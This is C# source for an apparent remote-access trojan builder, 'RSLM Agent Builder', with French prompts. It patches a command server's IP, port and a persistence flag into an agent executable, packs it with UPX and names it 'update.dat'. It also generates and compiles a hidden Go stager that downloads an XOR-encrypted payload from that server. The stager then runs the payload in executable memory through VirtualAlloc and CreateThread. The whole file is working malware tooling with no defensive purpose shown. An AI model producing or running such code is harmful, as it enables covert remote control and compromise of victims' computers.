using System;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace RSLM.Builder
{
    class Program
    {
        static void Main(string[] args)
        {
            // Mode automatique (avec arguments)
            if (args.Length >= 2)
            {
                string ip = args[0];
                int port = int.Parse(args[1]);
                bool persistence = args.Length > 2 && args[2] == "true";
                bool hide = args.Length > 3 && args[3] == "true";
                string outFile = args.Length > 4 ? args[4] : "update.dat";
                bool upx = args.Length > 5 && args[5] == "true";
                bool downloader = args.Length > 6 && args[6] == "true";

                RunBuilder(ip, port, persistence, hide, outFile, upx, downloader);
                return;
            }

            // Mode interactif (manuel)
            Console.WriteLine("=== RSLM Agent Builder ===\n");

            Console.Write("IP du serveur: ");
            string serverIp = Console.ReadLine();

            Console.Write("Port du serveur (4782): ");
            string portInput = Console.ReadLine();
            int serverPort = string.IsNullOrEmpty(portInput) ? 4782 : int.Parse(portInput);

            Console.Write("Activer la persistance? (o/n): ");
            bool enablePersistence = Console.ReadLine().ToLower() == "o";

            Console.Write("Cacher au démarrage? (o/n): ");
            bool hideOnStart = Console.ReadLine().ToLower() == "o";

            Console.Write("Nom du fichier de sortie [update.dat]: ");
            string outputFile = Console.ReadLine();
            if (string.IsNullOrEmpty(outputFile)) outputFile = "update.dat";

            Console.Write("Compresser avec UPX? (o/n): ");
            bool useUpx = Console.ReadLine().ToLower() == "o";

            Console.Write("Générer le downloader Go? (o/n): ");
            bool genDownloader = Console.ReadLine().ToLower() == "o";

            RunBuilder(serverIp, serverPort, enablePersistence, hideOnStart, outputFile, useUpx, genDownloader);
        }

        static void RunBuilder(string ip, int port, bool persistence, bool hide, string outFile, bool upx, bool genDownloader)
        {
            // Chemin FIXE vers agent_template.exe (dans le dossier du builder)
            string templatePath = @"C:\Users\Keylan\Desktop\RLSM.6.04\RSLM.Builder\bin\Release\agent_template.exe";

            if (!File.Exists(templatePath))
            {
                Console.WriteLine($"[ERREUR] agent_template.exe non trouvé dans {templatePath}");
                return;
            }

            File.Copy(templatePath, outFile, true);
            Console.WriteLine($"Template copié vers {outFile}");

            if (upx)
                CompressWithUPX(outFile);

            byte[] data = File.ReadAllBytes(outFile);

            // IP
            byte[] ipPlaceholder = Encoding.ASCII.GetBytes("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");
            byte[] ipBytes = Encoding.ASCII.GetBytes(ip.PadRight(64, '\0'));
            int ipOffset = FindPattern(data, ipPlaceholder);
            if (ipOffset >= 0)
            {
                Array.Copy(ipBytes, 0, data, ipOffset, ipBytes.Length);
                Console.WriteLine($"IP modifiée: {ip}");
            }

            // Port
            byte[] portPattern = { 0xAE, 0x12 };
            int portOffset = FindPattern(data, portPattern);
            if (portOffset >= 0)
            {
                byte[] newPortBytes = { (byte)(port & 0xFF), (byte)((port >> 8) & 0xFF) };
                Array.Copy(newPortBytes, 0, data, portOffset, 2);
                Console.WriteLine($"Port modifié: {port}");
            }

            // Persistance
            byte[] falseBytes = Encoding.ASCII.GetBytes("false");
            int flagOffset = FindPattern(data, falseBytes);
            if (flagOffset >= 0)
            {
                byte[] newFlag = persistence ? Encoding.ASCII.GetBytes("true") : falseBytes;
                Array.Copy(newFlag, 0, data, flagOffset, newFlag.Length);
                Console.WriteLine($"Persistance: {(persistence ? "activée" : "désactivée")}");
            }

            File.WriteAllBytes(outFile, data);
            Console.WriteLine($"Agent généré: {outFile}");

            if (genDownloader)
                GenerateGoDownloader(ip, port);
        }

        static int FindPattern(byte[] data, byte[] pattern)
        {
            for (int i = 0; i <= data.Length - pattern.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found) return i;
            }
            return -1;
        }

        static void CompressWithUPX(string filePath)
        {
            string upxPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "upx.exe");
            if (!File.Exists(upxPath)) return;
            Process.Start(new ProcessStartInfo
            {
                FileName = upxPath,
                Arguments = $"--best --ultra-brute \"{filePath}\"",
                UseShellExecute = false,
                CreateNoWindow = true
            })?.WaitForExit();
        }

        static void GenerateGoDownloader(string ip, int port)
        {
            Console.WriteLine("Génération du downloader Go...");

            try
            {
                Process p = Process.Start(new ProcessStartInfo { FileName = "go", Arguments = "version", UseShellExecute = false, CreateNoWindow = true });
                p.WaitForExit(1000);
                if (p.ExitCode != 0) throw new Exception();
            }
            catch
            {
                Console.WriteLine("Go non installé");
                return;
            }

            string goCode = @"
package main

import (
	""io""
	""net/http""
	""syscall""
	""unsafe""
)

const XOR_KEY = 0xAA

func xorDecrypt(data []byte) {
	for i := 0; i < len(data); i++ {
		data[i] ^= XOR_KEY
	}
}

func main() {
	url := ""http://{IP}:8080/update.dat""
	
	resp, err := http.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	encrypted, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	
	xorDecrypt(encrypted)
	
	kernel32 := syscall.NewLazyDLL(""kernel32.dll"")
	virtualAlloc := kernel32.NewProc(""VirtualAlloc"")
	rtlMoveMemory := syscall.NewLazyDLL(""ntdll.dll"").NewProc(""RtlMoveMemory"")
	createThread := kernel32.NewProc(""CreateThread"")
	waitForSingleObject := kernel32.NewProc(""WaitForSingleObject"")
	
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(encrypted)), 0x3000, 0x40)
	if addr == 0 {
		return
	}
	
	rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&encrypted[0])), uintptr(len(encrypted)))
	thread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
	if thread != 0 {
		waitForSingleObject.Call(thread, 0xFFFFFFFF)
	}
}
";
            goCode = goCode.Replace("{IP}", ip);

            string tempFile = Path.GetTempFileName() + ".go";
            File.WriteAllText(tempFile, goCode);

            ProcessStartInfo build = new ProcessStartInfo
            {
                FileName = "go",
                Arguments = $"build -ldflags=\"-H windowsgui -s -w\" -o stub.exe \"{tempFile}\"",
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process p = Process.Start(build))
            {
                p.WaitForExit();
                if (File.Exists("stub.exe"))
                    Console.WriteLine("stub.exe généré");
                else
                    Console.WriteLine("Échec compilation");
            }

            File.Delete(tempFile);
        }
    }
}